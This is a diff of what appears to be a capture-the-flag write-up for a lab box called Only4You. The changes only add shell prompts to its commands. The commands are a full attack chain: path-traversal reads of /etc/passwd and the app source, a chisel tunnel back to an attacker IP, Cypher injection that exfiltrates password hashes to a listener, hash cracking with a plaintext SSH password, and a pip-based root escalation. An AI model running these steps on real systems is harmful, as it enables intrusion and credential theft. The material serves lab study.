@@ -26,8 +26,8 @@ Two ports:
 Wide scan, then service detection:
 
 ```bash
-nmap -p- --min-rate 10000 10.129.54.20
-nmap -p 22,80 -sCV 10.129.54.20
+$ nmap -p- --min-rate 10000 10.129.54.20
+$ nmap -p 22,80 -sCV 10.129.54.20
 ```
 
 ```
@@ -95,7 +95,7 @@ def download():
 The check only rejects `..` anywhere in the name or a leading `../`. It never blocks an absolute path. And the next line only prepends the safe `LIST_FOLDER` when the path is not already absolute. The reason that matters is `os.path.join`: if any later component is an absolute path, Python discards every component before it. So `os.path.join(LIST_FOLDER, '/etc/passwd')` evaluates to `/etc/passwd`. An absolute `image` value sails through the filter and reads any file. This is a clean LFI:
 
 ```bash
-curl -s http://beta.only4you.htb/download -d 'image=/etc/passwd'
+$ curl -s http://beta.only4you.htb/download -d 'image=/etc/passwd'
 ```
 
 ```
@@ -109,7 +109,7 @@ dev:x:1001:1001::/home/dev:/bin/bash
 Real users `dev`, `john`, `root`, plus a `neo4j` service account. With arbitrary read I pulled the nginx config to map both vhosts to their unix sockets, which tells me where the main app's source lives:
 
 ```bash
-curl -s http://beta.only4you.htb/download -d 'image=/etc/nginx/sites-enabled/default'
+$ curl -s http://beta.only4you.htb/download -d 'image=/etc/nginx/sites-enabled/default'
 ```
 
 ```
@@ -122,8 +122,8 @@ server { listen 80; server_name beta.only4you.htb;
 Then the main app's `app.py` and the helper it imports, `form.py`:
 
 ```bash
-curl -s http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/app.py'
-curl -s http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/form.py'
+$ curl -s http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/app.py'
+$ curl -s http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/form.py'
 ```
 
 ## foothold
@@ -165,7 +165,7 @@ That gave a reverse shell as `www-data`.
 On the box, the listening sockets show several internal services bound to loopback that are not exposed externally:
 
 ```bash
-ss -tlnp
+$ ss -tlnp
 ```
 
 ```
@@ -179,15 +179,15 @@ To reach them from my box I pivoted with chisel. Server on my side, client on th
 
 ```bash
 # attacker
-./chisel server -p 8000 --reverse
+$ ./chisel server -p 8000 --reverse
 # on target
-./chisel client 10.10.16.5:8000 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000
+$ ./chisel client 10.10.16.5:8000 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000
 ```
 
 The internal app on `8001` logs in with `admin:admin`. Its employee `/search` endpoint runs a Cypher query against neo4j and is injectable. neo4j has no UNION-style stacking for exfil, so the standard trick is `LOAD CSV FROM`, which makes the database issue an HTTP request to a URL I control, smuggling the data out in the query string. I started an HTTP handler to catch the callbacks:
 
 ```bash
-python3 -m http.server 9999
+$ python3 -m http.server 9999
 ```
 
 Version first, to confirm injection and know what I am hitting:
@@ -229,13 +229,13 @@ My handler caught the usernames and password hashes:
 Both are unsalted SHA-256, so they crack instantly. admin's hash is just the word `admin`. john's I ran with hashcat mode `1400`, though a rainbow table like CrackStation returns it just as fast since there is no salt:
 
 ```bash
-hashcat -a 0 -m 1400 hash /usr/share/seclists/rockyou.txt
+$ hashcat -a 0 -m 1400 hash /usr/share/seclists/rockyou.txt
 ```
 
 john's password is `ThisIs4You`, reused for SSH:
 
 ```bash
-ssh john@only4you.htb   # ThisIs4You
+$ ssh john@only4you.htb   # ThisIs4You
 ```
 
 That is the user flag.
@@ -285,20 +285,20 @@ setup(
 Build the sdist:
 
 ```bash
-python3 setup.py sdist
+$ python3 setup.py sdist
 ```
 
 The sudo rule pins the source to Gogs on `3000`, so I needed the tarball hosted there. I registered an account on the tunneled Gogs (`admin:admin` works, or a fresh signup), created a repo, and pushed the built `Backage-0.1.tar.gz` so it is reachable at a raw URL. Then I had root pull it:
 
 ```bash
-sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Backage/raw/master/Backage-0.1.tar.gz
+$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Backage/raw/master/Backage-0.1.tar.gz
 ```
 
 pip resolves the sdist, builds it, the overridden `egg_info` runs as root, and `/bin/bash` comes back wearing the SUID bit. `bash -p` keeps the effective UID and drops to a root shell:
 
 ```bash
-ls -la /bin/bash
-bash -p
+$ ls -la /bin/bash
+$ bash -p
 ```
 
 ```
